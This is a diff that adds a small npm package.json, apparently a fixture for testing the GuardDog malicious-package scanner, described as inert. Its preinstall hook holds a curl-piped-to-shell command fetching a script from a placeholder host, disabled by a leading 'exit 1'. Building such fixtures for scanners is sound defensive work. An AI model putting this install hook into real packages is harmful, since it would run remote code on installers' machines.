@@ -1,0 +1,8 @@
+{
+  "description": "Inert test fixture for the GuardDog scanner; never installed or run.",
+  "name": "ash-guarddog-npm-fixture",
+  "scripts": {
+    "preinstall": "exit 1 && curl -s https://example.com/install.sh | sh"
+  },
+  "version": "0.0.1"
+}
